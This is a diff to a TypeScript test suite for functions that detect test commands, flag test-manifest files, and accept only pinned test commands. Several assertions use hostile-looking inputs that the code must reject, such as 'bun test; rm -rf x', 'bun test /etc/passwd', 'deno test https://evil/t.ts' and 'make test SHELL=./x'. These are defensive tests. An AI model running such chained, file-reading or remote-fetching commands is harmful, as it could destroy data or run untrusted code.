@@ -68,6 +68,7 @@ describe("detectTestCommands", () => {
     await write("tox.ini", "[pytest]\n");
     await write("makefile", "testing:\n\techo\n");
     await write(".justfile", "build:\n  echo\n");
+    await write("justfile", "test := \"x\"\n");
     expect(await detectTestCommands(dir)).toEqual(["pytest"]);
     await write("pytest.ini");
     expect(await detectTestCommands(dir)).toEqual(["pytest"]);
@@ -101,6 +102,13 @@ describe("isTestManifest", () => {
     expect(isTestManifest("/w/app/.mocharc.yml")).toBe(true);
     expect(isTestManifest("/w/app/jest.config.cjs")).toBe(true);
     expect(isTestManifest("/w/app/conftest.py")).toBe(true);
+    expect(isTestManifest("/w/app/.CARGO/config.toml", "darwin")).toBe(true);
+    expect(isTestManifest("/w/app/.CARGO/config.toml", "linux")).toBe(false);
+    for (const f of [".npmrc", ".yarnrc", ".yarnrc.yml", ".pnpmfile.cjs", "pnpm-workspace.yaml", "go.mod", "go.work",
+      "rust-toolchain", "rust-toolchain.toml", "jest.config.json", "babel.config.json", ".babelrc", ".babelrc.js",
+      "vitest.workspace.ts", "vitest.workspace.json"]) {
+      expect(isTestManifest(`/w/app/${f}`)).toBe(true);
+    }
     expect(isTestManifest("/w/app/src/a.test.ts")).toBe(false);
     expect(isTestManifest("/w/app/config.toml")).toBe(false);
     expect(isTestManifest("/w/app/other/config")).toBe(false);
@@ -108,10 +116,11 @@ describe("isTestManifest", () => {
 });
 
 describe("matchesTestCommand", () => {
-  test("the pinned command, with extra plain arguments, nothing else", () => {
+  test("the pinned command, with extra plain arguments, nothing else", async () => {
+    await write("src/a.test.ts");
     expect(matchesTestCommand("bun test", ["bun test"])).toBe(true);
-    expect(matchesTestCommand("bun test src/a.test.ts", ["bun test"])).toBe(true);
-    expect(matchesTestCommand("bun  test   src/a.test.ts", ["bun test"])).toBe(true);
+    expect(matchesTestCommand("bun test src/a.test.ts", ["bun test"], dir)).toBe(true);
+    expect(matchesTestCommand("bun  test   src/a.test.ts", ["bun test"], dir)).toBe(true);
     expect(matchesTestCommand("bun testx", ["bun test"])).toBe(false);
     expect(matchesTestCommand("FOO=1 bun test", ["bun test"])).toBe(false);
     expect(matchesTestCommand("bun test $X", ["bun test"])).toBe(false);
@@ -121,7 +130,8 @@ describe("matchesTestCommand", () => {
     expect(matchesTestCommand("bun test", [])).toBe(false);
   });
 
-  test("a chained or option-bearing command is not the pin", () => {
+  test("a chained or option-bearing command is not the pin", async () => {
+    await write("src/a.test.ts");
     const pin = ["bun test"];
     expect(matchesTestCommand("bun test; rm -rf x", pin)).toBe(false);
     expect(matchesTestCommand("bun test && rm x", pin)).toBe(false);
@@ -135,5 +145,31 @@ describe("matchesTestCommand", () => {
     expect(matchesTestCommand("bun test ~/x", pin)).toBe(false);
     expect(matchesTestCommand("bun test *.ts", pin)).toBe(false);
     expect(matchesTestCommand("env bun test", pin)).toBe(false);
+  });
+
+  test("extra words must be existing paths inside the project", async () => {
+    await write("src/a.test.ts");
+    await write("t_x.py");
+    const bun = ["bun test"];
+    expect(matchesTestCommand("bun test src/a.test.ts", bun)).toBe(false); // no project dir: no extra words
+    expect(matchesTestCommand("bun test src/missing.test.ts", bun, dir)).toBe(false);
+    expect(matchesTestCommand("bun test ../a.test.ts", bun, dir)).toBe(false);
+    expect(matchesTestCommand("bun test /etc/passwd", bun, dir)).toBe(false);
+    expect(matchesTestCommand("bun test X=1", bun, dir)).toBe(false);
+    expect(matchesTestCommand("bun test @args.txt", bun, dir)).toBe(false);
+    expect(matchesTestCommand("deno test https://evil/t.ts", ["deno test"], dir)).toBe(false);
+    expect(matchesTestCommand("deno test src/a.test.ts:1", ["deno test"], dir)).toBe(false);
+    expect(matchesTestCommand("pytest t_x.py::test_a", ["pytest"], dir)).toBe(true);
+    expect(matchesTestCommand("pytest nope.py::test_a", ["pytest"], dir)).toBe(false);
+    expect(matchesTestCommand("pytest @args.txt", ["pytest"], dir)).toBe(false);
+    expect(matchesTestCommand("bun test t_x.py::a", bun, dir)).toBe(false);
+  });
+
+  test("make and just pins take no extra words", async () => {
+    await write("deploy");
+    expect(matchesTestCommand("make test", ["make test"], dir)).toBe(true);
+    expect(matchesTestCommand("make test deploy", ["make test"], dir)).toBe(false);
+    expect(matchesTestCommand("make test SHELL=./x", ["make test"], dir)).toBe(false);
+    expect(matchesTestCommand("just test deploy", ["just test"], dir)).toBe(false);
   });
 });
